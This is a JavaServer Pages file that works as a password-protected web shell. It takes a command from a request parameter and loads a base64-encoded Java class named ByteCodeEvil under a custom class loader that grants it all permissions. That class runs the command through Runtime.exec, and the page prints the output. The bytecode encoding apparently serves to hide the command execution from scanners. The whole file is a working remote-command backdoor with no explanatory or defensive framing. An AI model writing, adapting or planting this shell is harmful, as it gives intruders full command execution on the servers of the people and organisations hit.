<%@ page language="java" pageEncoding="UTF-8" %>
<%
    String PASSWORD = "password";
    String passwd = request.getParameter("pwd");
    String cmd = request.getParameter("cmd");
    if (!passwd.equals(PASSWORD)) {
        return;
    }
    ClassLoader loader = new ClassLoader() {
        @Override
        public Class<?> loadClass(String name) throws ClassNotFoundException {
            if(name.contains("ByteCodeEvil")){
                return findClass(name);
            }
            return super.loadClass(name);
        }
        @Override
        protected Class<?> findClass(String name) throws ClassNotFoundException {
            try {
                byte[] bytes =  new sun.misc.BASE64Decoder().decodeBuffer("yv66vgAAADQAcQoAGwAvBwAwCgACAC8HADEHADIKADMANAoAMwA1CgA2ADcKAAUAOAoABAA5CgAEADoKAAIAOwgAPAoAAgA9CQAQAD4HAD8KAEAAQQgAQgoAQwBECgBFAEYKAEUARwcASAoAFgAvCgAWAEkJAEoASwoATABNBwBOAQADcmVzAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAD8HAE8HADAHADEBAApFeGNlcHRpb25zBwBQAQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAKU291cmNlRmlsZQEAEUJ5dGVDb2RlRXZpbC5qYXZhDAAeAFEBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwBSDABTAFQMAFUAVgcAVwwAWABZDAAeAFoMAB4AWwwAXAAqDABdAF4BAAEKDAApACoMABwAHQEAGm9yZy9zZWMvc3RhcnQvQnl0ZUNvZGVFdmlsBwBfDABgAGEBABJCeXRlQ29kZUV2aWwuY2xhc3MHAGIMAGMAZAcAZQwAZgBnDABoAGkBABZzdW4vbWlzYy9CQVNFNjRFbmNvZGVyDABqAGsHAGwMAG0AbgcAbwwAcAAfAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQADKClWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAD2phdmEvbGFuZy9DbGFzcwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAE2dldFJlc291cmNlQXNTdHJlYW0BACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAAlhdmFpbGFibGUBAAMoKUkBAARyZWFkAQAFKFtCKUkBAAxlbmNvZGVCdWZmZXIBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuACEAEAAbAAAAAQAAABwAHQAAAAMAAQAeAB8AAgAgAAAAnAAGAAUAAABHKrcAAbsAAlm3AANNuwAEWbsABVm4AAYrtgAHtgAItwAJtwAKTi22AAtZOgTGABIsGQS2AAwSDbYADFen/+oqLLYADrUAD7EAAAACACEAAAAiAAgAAAAMAAQADQAMAA4AFAAPACUAEQAvABIAPgAUAEYAFQAiAAAAGwAC/wAlAAQHACMHACQHACUHACYAAPwAGAcAJAAnAAAABAABACgAAQApACoAAQAgAAAAHQABAAEAAAAFKrQAD7AAAAABACEAAAAGAAEAAAAYAAkAKwAsAAIAIAAAAGAAAgAFAAAAMBIQtgAREhK2ABNMK7YAFLwITSsstgAVV7sAFlm3ABdOLSy2ABg6BLIAGRkEtgAasQAAAAEAIQAAAB4ABwAAABwACwAdABIAHgAYAB8AIAAgACcAIQAvACIAJwAAAAQAAQAoAAEALQAAAAIALg==");
                java.security.PermissionCollection pc = new java.security.Permissions();
                pc.add(new java.security.AllPermission());
                java.security.ProtectionDomain protectionDomain = new java.security.ProtectionDomain(
                        new java.security.CodeSource(null, (java.security.cert.Certificate[]) null), pc, this, null);
                return this.defineClass(name, bytes, 0, bytes.length, protectionDomain);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return super.findClass(name);
        }
    };
    Class<?> clazz = loader.loadClass("org.sec.start.ByteCodeEvil");
    java.lang.reflect.Constructor<?> constructor = clazz.getConstructor(String.class);
    String result = constructor.newInstance(cmd).toString();
    response.getWriter().print("<pre>");
    response.getWriter().print(result);
    response.getWriter().print("</pre>");
%>